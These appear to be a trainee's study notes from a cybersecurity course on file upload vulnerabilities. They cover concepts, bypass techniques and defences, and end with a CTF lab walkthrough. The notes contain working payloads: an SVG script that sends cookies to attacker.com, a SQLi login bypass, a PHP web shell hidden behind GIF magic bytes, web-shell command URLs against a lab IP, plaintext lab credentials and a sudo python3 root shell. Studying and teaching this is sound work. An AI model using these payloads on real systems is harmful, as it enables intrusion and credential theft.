# Day 17 — File upload

**Topic:** File Upload Vulnerabilities — From Simple Bugs to Remote Code Execution (RCE)

**Date:** Sunday May 16, 2026

---

## CSP and SQL Injection

Content Security Policy (CSP) is a browser-level security header that controls what resources (scripts, styles, iframes) are allowed to load and execute on a page. While CSP is primarily a defense against XSS, it has indirect relevance to SQL injection chains:

- CSP **does not prevent** SQL injection itself — SQLi happens server-side
- CSP **limits the impact** of a successful SQLi → XSS chain (e.g., if injected JS is reflected in the page, CSP can block its execution)
- A strict CSP reduces what an attacker can do *after* gaining access through SQLi (e.g., cannot exfiltrate data to an external domain if it's not in the CSP allowlist)
- CSP is **not a substitute** for input sanitization and parameterized queries

---

## What Is File Upload Functionality?

File upload features are common in web applications — profile pictures, document submissions, email attachments, media content, and CMS plugin uploads all involve accepting files from users.

**Why this increases the attack surface:**
- Untrusted files enter the server environment
- Filenames may contain path traversal sequences (`../`)
- MIME types are easily spoofed by attackers
- Executable files can masquerade as images
- Storage paths may be web-accessible
- Validation is often insufficient at the client or server side

---

## How File Upload Handling Works

### Client-Side Validation
- `HTML accept=` attribute restricts file types in the browser UI
- JavaScript validates before form submission
- File size checks run in the browser

> ⚠️ Client-side validation is trivially bypassed using Burp Suite or by modifying the request directly. **Never rely on it as a security control.**

### Server-Side Processing
- Extension whitelist / blacklist checks
- MIME type detection via the `Content-Type` header
- Magic byte / file signature analysis
- File renamed and stored on disk
- Web server decides whether the file is executable

**Key concepts:**
- **MIME Type** — metadata describing file format (e.g. `image/png`)
- **Extension** — suffix like `.php`, `.jpg`
- **Storage Path** — where the file lands on the server filesystem
- **Magic Bytes** — the first few bytes of a file that identify its true type (e.g. `GIF89a` for GIFs, `\x89PNG` for PNGs)

---

## Common File Upload Validation Failures

| Failure | How It's Exploited |
|---|---|
| Extension-only checks | Rename `shell.php` → `shell.jpg`; check passes |
| Client-side validation trust | Intercept with Burp, replace payload post-validation |
| Weak Content-Type verification | Send `Content-Type: image/jpeg` with PHP content |
| Executable upload directories | Any `.php` in `/uploads/` can be triggered via URL |

---

## Attack Vector 1 — File Upload → Stored XSS

**How it works:**
1. Attacker uploads a malicious `.svg` or `.html` file
2. Server stores it in a web-accessible path
3. Victim browses to or views the uploaded file
4. Browser executes the embedded JavaScript
5. Cookies, tokens, or keystrokes are stolen

**Why SVG is dangerous:** SVG is XML-based and supports `<script>` tags natively. When served by a browser, it executes in the page's origin context.

```xml
<svg xmlns="http://www.w3.org/2000/svg">
  <script>
    document.location='https://attacker.com/steal?c='+document.cookie
  </script>
</svg>
```

An uploaded `.html` file served directly by the web server runs in the **same origin** — giving the script access to cookies and local storage for that domain.

---

## Attack Vector 2 — File Upload → HTML Injection

Similar to stored XSS but the file *itself* becomes the malicious page, served under the application's trusted origin.

**Same-origin risks:**
- Reads cookies and local storage of the same domain
- Performs credentialed AJAX requests to the application
- Phishing forms injected into the legitimate domain
- Can redirect users to attacker-controlled pages

**Difference from XSS:** HTML injection via upload doesn't require a reflected/stored XSS flaw in the app's code — the uploaded file *is* the attack page.

---

## Attack Vector 3 — File Upload → Information Disclosure

- **Public upload directories:** Files in `/uploads/` that are web-accessible allow URL enumeration — attackers guess paths to access other users' files
- **Directory listing exposure:** Misconfigured Apache/Nginx serves a listing of all files in the upload folder
- **File overwrite:** Predictable filenames let an attacker overwrite existing files or probe for file existence via HTTP status codes

---

## Attack Vector 4 — File Upload → Path Traversal

When a server uses a user-supplied filename in a file path without sanitization, an attacker can craft filenames with directory traversal sequences to write files outside the intended upload directory.

```
Filename in request:  ../../../etc/passwd
Resolved path on server:  /etc/passwd
```

**Bypass techniques for weak sanitization:**
- Double encoding: `..%2F..%2F` — the filter strips one level but the OS decodes both
- Null byte injection: `shell.php%00.jpg` — terminates the extension check while the OS sees the full path
- Unicode/UTF-8 encoding of `/` or `..` passes pattern matching but decodes correctly on disk

---

## What Is Remote Code Execution (RCE)?

**Definition:** RCE is a vulnerability class that allows an attacker to execute arbitrary code on a target system from a remote location — without physical access or an existing account on the server.

**Why RCE is rated Critical (CVSS 9.0–10.0):**
- No prior credentials required
- Attacker gains control at the web server process privilege level
- Enables all downstream attacks: data theft, ransomware, lateral movement
- A single vulnerability can compromise the entire infrastructure

**Post-RCE impact:**
- **Credential access** — `/etc/shadow`, DB config files, SSH keys, API keys from env vars
- **Data exfiltration** — full database dump, PII, financial records
- **Lateral movement** — scan internal network, pivot to adjacent systems via stolen creds
- **Privilege escalation** — SUID abuse, misconfigured sudo, rootkits

---

## How File Upload Can Lead to RCE

| Mechanism | How It Works |
|---|---|
| Uploading server-interpreted files | Apache/Nginx with PHP module executes any `.php` file in `/uploads/` when requested via URL |
| Double extensions | `image.php.jpg` passes extension check (ends in `.jpg`) but Apache may pass it to the PHP handler |
| MIME type confusion | Server checks `Content-Type: image/jpeg` but doesn't verify actual file content — PHP slips through |
| Misconfigured web servers | `.htaccess` overrides or permissive `AddHandler` directives make `.jpg` files execute as PHP |

---

## File Upload → Web Shell

A **web shell** is a script uploaded to a vulnerable server that — once accessible via browser — provides an attacker with remote command-line control of the underlying OS through the HTTP interface.

**Key characteristics:**
- Typically a single small script (PHP, JSP, ASPX)
- Accepts OS commands via URL parameter or form input (`?cmd=`)
- Returns command output in the HTTP response body
- Provides persistent access — survives server restarts
- Used for recon, exfiltration, and pivoting

**Conceptual execution flow:**
```
1. Attacker uploads script file
   └─ File stored on web server disk
2. Attacker sends HTTP request
   └─ GET /uploads/shell.php?cmd=id
3. Web interpreter receives request
   └─ Executes embedded OS command via system()
4. Command output returned in HTTP response
   └─ Attacker reads server internals
```

> ⚠️ Uploading web shells to systems without explicit authorization is illegal. Always use authorized lab environments.

---

## RCE Execution Flow (Attack Chain)

```
CRAFT Payload → UPLOAD File → SERVER Stores File → HTTP Request → INTERPRETER Executes → OS Command Runs
```

**Phase 1 — Preparation & Upload:**
- Craft executable script with OS command passthrough
- Bypass client-side validation (modify request headers in Burp)
- Spoof MIME type to pass server-side checks
- File lands on server disk in upload directory

**Phase 2 — Activation:**
- Send HTTP GET to the uploaded file's URL
- Web server routes request to the script interpreter (PHP/JSP)
- Interpreter processes the script and executes OS calls
- Commands run under web server process privileges (e.g., `www-data`)

**Phase 3 — Post-Exploitation:**
- Command output returned in HTTP response body
- Read filesystem, network config, credentials
- Establish reverse shell or backdoor
- Pivot internally or escalate privileges

---

## SVG / XML in File Uploads

SVG deserves special attention because:
- It is an **XML-based image format** that browsers render natively
- It supports embedded `<script>` and event handlers (`onload`, `onclick`)
- Servers that accept images often accept SVG without treating it as code
- When served directly, SVG executes in the **full browser context** of the serving origin
- A WAF or Content-Type check alone won't stop it if the file is stored and served as-is

**XML External Entity (XXE) via SVG:** SVG/XML uploads can also trigger XXE if the server-side XML parser processes the file content — allowing local file reads (e.g. `/etc/passwd`) without any browser involvement.

---

## Common Bypass Categories

| Category | Techniques |
|---|---|
| Extension bypass | Double extension (`.php.jpg`), alternate extensions (`.php5`, `.phtml`, `.phar`) |
| MIME / Content-Type bypass | Set `Content-Type: image/jpeg` while uploading PHP content |
| Magic byte bypass | Prepend `GIF89a;` or PNG header bytes before the PHP payload |
| Null byte injection | `shell.php%00.jpg` — terminates extension processing at `%00` |
| Case variation | `.PHP`, `.Php` to evade case-sensitive blacklists |
| `.htaccess` upload | Upload a custom `.htaccess` to make `.jpg` files execute as PHP |
| Path traversal in filename | `../shell.php` to write outside the intended directory |
| Encoding | URL-encode or double-encode `/` and `.` to bypass filter patterns |

---

## Preventing File Upload Vulnerabilities

### Upload Validation
- **Allow-list extensions only** — permit only `.jpg`, `.png`, `.pdf`, etc. Never use a blacklist (attackers always find edge cases)
- **Validate magic bytes** — use `libmagic` or `python-magic` to verify actual file content, not just the extension or `Content-Type` header
- **Reject dangerous types** — explicitly block `.php`, `.phtml`, `.php5`, `.phar`, `.jsp`, `.aspx`, `.svg`, `.html`, `.htm`, `.sh`

### Storage & Execution
- **Randomize filenames** — generate a UUID or hash as the stored filename; never use the attacker-supplied filename on disk
- **Store outside the web root** — `/var/uploads/` instead of `/var/www/html/uploads/`; files should never be directly executable via URL
- **Disable script execution in upload directories:**

```nginx
# Nginx
location /uploads/ {
    add_header Content-Type text/plain;
}
```

```apache
# Apache .htaccess
Options -ExecCGI
AllowOverride None
php_admin_value engine Off
```

### Architecture Controls
- **Least privilege** — run the web server as a restricted, unprivileged user (`www-data`); limits blast radius if RCE occurs
- **Serve files through code** — never serve uploaded files by direct URL; stream them through application code that sets the correct headers

### Defense-in-Depth Layers

| Layer | Control |
|---|---|
| Outer | WAF — blocks known malicious upload patterns and suspicious filenames at the perimeter |
| Layer 2 | AV/malware scanning — scan with ClamAV or a cloud API before storage |
| Layer 3 | CSP — limits XSS impact even if a malicious file is served |
| Inner | Sandboxing/isolation — process uploads in an isolated container; malicious payloads cannot reach the host |

> Defense-in-depth principle: **bypassing one layer must not result in full system compromise.**

---

## Real-World RCE Cases

| Year | Case | CVE | Summary |
|---|---|---|---|
| 2017 | ImageMagick (ImageTragick) | CVE-2016-3714 | Crafted image files triggered OS command execution via the image processing library |
| 2019 | WordPress File Manager Plugin | CVE-2020-25213 | Unauthenticated upload of PHP files directly through the plugin interface |
| 2021 | Accellion FTA | CVE-2021-27101 | RCE via file upload in legacy file transfer appliance; government agencies affected |
| 2022 | MOVEit Transfer | CVE-2023-34362 | File upload + SQLi chain allowed web shell deployment; hundreds of organizations breached |

---

## Lab: IntraPortal CTF — Full Attack Chain

Today's practical demonstrated the full escalation path on the IntraPortal lab target.

**Attack chain:** `SQLi → Admin Access → File Upload Bypass → Web Shell RCE → Credential Leak → SSH → sudo privesc → Root`

### Step 1 — SQL Injection Login Bypass
Login form had no input sanitization. Classic payload in the username field:
```
' OR '1'='1'--
```
Result: Full admin dashboard access (`Welcome back, admin`).

### Step 2 — Sensitive Data Exposure (Config Page)
The Config tab exposed plaintext server credentials:
- Service Account: `labuser`
- Service Password: `WebL4b!2024`
- SSH Port: `22`
- Upload Path: `/var/www/html/uploads/`
- PHP Version: `7.4.3`

### Step 3 — File Upload Bypass
The File Manager accepted `image/*` only. Three techniques were chained:

| Technique | Effect |
|---|---|
| GIF magic bytes (`GIF89a;`) | Fools server-side MIME detection |
| Double extension (`.php.png`) | Server executes the `.php` portion |
| `Content-Type: image/png` | Satisfies the upload MIME check |

The Burp request set `filename="sofonyas.php"` with `Content-Type: image/png` and the payload `GIF89a; <?php system($_GET['cmd']); ?>`. Server responded: `File saved: sofonyas.php.png`.

### Step 4 — RCE via Web Shell
```
http://139.144.167.25/uploads/sofonyas.php?cmd=id
```
Response: `GIF89a; uid=33(www-data) gid=33(www-data) groups=33(www-data)` — RCE confirmed.

### Step 5 — User Flag
```
http://139.144.167.25/uploads/sofonyas.php?cmd=cat+/home/labuser/user.txt
```
Flag: `flag{web_sqli_cmd_inject_upload}`

### Step 6 — SSH + Privilege Escalation to Root
Used Config page credentials to SSH in:
```bash
ssh labuser@139.144.167.25   # password: WebL4b!2024
sudo -l
# → (root) NOPASSWD: /usr/bin/python3
sudo python3 -c 'import pty; pty.spawn("/bin/bash")'
cat /root/root.txt
```
Flag: `flag{root_via_sudo_python3}`

**Why `sudo python3` = instant root:** When a binary that can spawn a shell is listed under `NOPASSWD` in sudoers, any user who can run it effectively has unrestricted root access. `python3 -c 'import pty; pty.spawn("/bin/bash")'` spawns a bash shell inheriting root privileges.

---

## Findings Summary

| # | Vulnerability | Severity | Impact |
|---|---|---|---|
| F1 | SQL Injection — login form | Critical | Full auth bypass |
| F2 | Plaintext credentials on Config page | High | SSH access as `labuser` |
| F3 | File upload bypass (MIME + double extension) | Critical | RCE as `www-data` |
| F4 | `sudo NOPASSWD /usr/bin/python3` | Critical | Full root shell |

---

*INSA Ethio Cyber Talent Weekend Program — Cybersecurity Track*
